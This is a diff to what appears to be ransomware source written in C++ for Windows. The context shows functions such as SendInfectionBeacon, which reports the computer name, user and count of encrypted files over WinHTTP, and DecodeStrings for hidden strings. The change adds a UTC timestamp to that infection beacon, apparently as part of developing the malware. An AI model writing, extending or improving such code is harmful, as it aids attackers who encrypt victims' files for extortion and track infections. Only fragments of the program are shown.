@@ -26,6 +26,9 @@
 #include <wincrypt.h>
 #include <Shlobj.h>
 #include <winhttp.h>
+#include <ctime>
+#include <time.h>
+
 
 #pragma comment (lib, "Winhttp.lib")
 
@@ -103,6 +106,7 @@ void HexToString(const std::string hexstr, std::string& str);
 void DecodeStrings();
 std::string GetLocalComputerName();
 std::string GetCurrentUser();
+std::string GetUtcTime();
 
 
 
@@ -371,6 +375,10 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 
 	post.append("; Files Infected: ");
 	post.append(std::to_string(dwEncryptedFileCount));
+
+	std::string timestamp = GetUtcTime();
+	post.append("; Timestamp: ");
+	post.append(timestamp);
 
 	post.append("\" }");
 
@@ -1214,4 +1222,20 @@ std::string GetCurrentUser()
 	std::string userName(chxfer);
 
 	return userName;
+}
+
+std::string GetUtcTime()
+{
+	time_t systemTime;
+	struct tm timeinfo;
+	char timeBuffer[80];
+
+	time(&systemTime);
+	gmtime_s(&timeinfo , &systemTime);
+
+	std::strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
+	std::string utcTime(timeBuffer);
+	utcTime.append(" UTC");
+	
+	return utcTime;
 }
